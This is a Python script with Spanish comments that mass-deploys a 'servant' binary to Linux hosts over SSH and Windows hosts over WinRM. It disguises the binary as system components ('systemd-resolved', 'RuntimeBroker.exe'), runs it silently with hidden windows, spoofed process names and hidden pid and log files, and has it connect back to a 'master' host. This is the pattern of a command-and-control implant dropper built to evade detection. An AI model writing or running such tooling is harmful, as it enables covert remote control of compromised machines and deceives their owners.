#!/usr/bin/env python3
"""
Script de despliegue masivo multiplataforma para servant.

Detecta automáticamente si el host es Linux o Windows y usa el método apropiado.

Requiere:
    pip install paramiko pywinrm

Uso:
    python deploy_multi.py --config hosts.json --token my-secret-token --master-ip 192.168.1.100
"""

import argparse
import json
import sys
import os
from pathlib import Path

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("Warning: paramiko no instalado. Despliegue SSH no disponible.")

try:
    import winrm
    HAS_WINRM = True
except ImportError:
    HAS_WINRM = False
    print("Warning: pywinrm no instalado. Despliegue WinRM no disponible.")


class DeployManager:
    def __init__(self, token, master_ip, master_port=65433):
        self.token = token
        self.master_ip = master_ip
        self.master_port = master_port
    
    def deploy_linux_ssh(self, host, username, password, binary_path):
        """Despliega en Linux vía SSH."""
        if not HAS_PARAMIKO:
            print(f"[-] Paramiko no disponible para {host}")
            return False
        
        print(f"[*] Desplegando en Linux {host}...")
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password, timeout=10)
            
            # Subir binario
            sftp = ssh.open_sftp()
            remote_path = '/tmp/systemd-resolved'
            sftp.put(binary_path, remote_path)
            sftp.chmod(remote_path, 0o755)
            sftp.close()
            
            # Ejecutar en modo daemon
            cmd = f"""
            {remote_path} \
                --daemon \
                --silent \
                --token {self.token} \
                --pidfile /var/tmp/.srv.pid \
                --logfile /var/tmp/.srv.log \
                --process-name systemd-resolved \
                --master-host {self.master_ip} \
                --master-port {self.master_port} &
            """
            
            stdin, stdout, stderr = ssh.exec_command(cmd)
            output = stdout.read().decode()
            error = stderr.read().decode()
            
            ssh.close()
            
            if error and 'error' in error.lower():
                print(f"[-] Error en {host}: {error}")
                return False
            
            print(f"[+] Desplegado exitosamente en {host}")
            return True
            
        except Exception as e:
            print(f"[-] Error conectando a {host}: {e}")
            return False
    
    def deploy_windows_winrm(self, host, username, password, binary_path):
        """Despliega en Windows vía WinRM."""
        if not HAS_WINRM:
            print(f"[-] pywinrm no disponible para {host}")
            return False
        
        print(f"[*] Desplegando en Windows {host}...")
        
        try:
            session = winrm.Session(f'http://{host}:5985/wsman', auth=(username, password))
            
            # Leer binario y codificar en base64
            import base64
            with open(binary_path, 'rb') as f:
                binary_data = f.read()
            binary_b64 = base64.b64encode(binary_data).decode()
            
            # PowerShell script para copiar y ejecutar
            remote_path = r"C:\Windows\Temp\RuntimeBroker.exe"
            ps_script = f"""
            $bytes = [System.Convert]::FromBase64String('{binary_b64}')
            [System.IO.File]::WriteAllBytes('{remote_path}', $bytes)
            
            $startInfo = New-Object System.Diagnostics.ProcessStartInfo
            $startInfo.FileName = '{remote_path}'
            $startInfo.Arguments = '--hide-window --silent --token {self.token} --pidfile C:\\Windows\\Temp\\.srv.pid --logfile C:\\Windows\\Temp\\.srv.log --master-host {self.master_ip} --master-port {self.master_port}'
            $startInfo.WindowStyle = 'Hidden'
            $startInfo.CreateNoWindow = $true
            
            $process = [System.Diagnostics.Process]::Start($startInfo)
            Write-Host "Servant desplegado. PID: $($process.Id)"
            """
            
            result = session.run_ps(ps_script)
            
            if result.status_code == 0:
                print(f"[+] Desplegado exitosamente en {host}")
                print(f"    Output: {result.std_out.decode().strip()}")
                return True
            else:
                print(f"[-] Error en {host}: {result.std_err.decode()}")
                return False
                
        except Exception as e:
            print(f"[-] Error conectando a {host}: {e}")
            return False


def load_config(config_path):
    """Carga configuración de hosts desde JSON."""
    with open(config_path, 'r') as f:
        return json.load(f)


def main():
    parser = argparse.ArgumentParser(description="Despliegue masivo multiplataforma")
    parser.add_argument('--config', required=True, help='Archivo JSON con configuración de hosts')
    parser.add_argument('--token', required=True, help='Token de autenticación')
    parser.add_argument('--master-ip', required=True, help='IP del master')
    parser.add_argument('--master-port', default=65433, type=int, help='Puerto del master')
    parser.add_argument('--linux-binary', default='dist/systemd-resolved', help='Binario Linux')
    parser.add_argument('--windows-binary', default='dist/RuntimeBroker.exe', help='Binario Windows')
    
    args = parser.parse_args()
    
    # Cargar configuración
    try:
        config = load_config(args.config)
    except Exception as e:
        print(f"Error cargando configuración: {e}")
        sys.exit(1)
    
    # Crear manager
    manager = DeployManager(args.token, args.master_ip, args.master_port)
    
    # Contadores
    total = 0
    success = 0
    
    # Desplegar en cada host
    for host_config in config.get('hosts', []):
        total += 1
        host = host_config['host']
        os_type = host_config['os'].lower()
        username = host_config['username']
        password = host_config.get('password', '')
        
        if os_type == 'linux':
            if manager.deploy_linux_ssh(host, username, password, args.linux_binary):
                success += 1
        elif os_type == 'windows':
            if manager.deploy_windows_winrm(host, username, password, args.windows_binary):
                success += 1
        else:
            print(f"[-] OS desconocido para {host}: {os_type}")
    
    print(f"\n=== Resumen: {success}/{total} desplegados exitosamente ===")


if __name__ == '__main__':
    main()
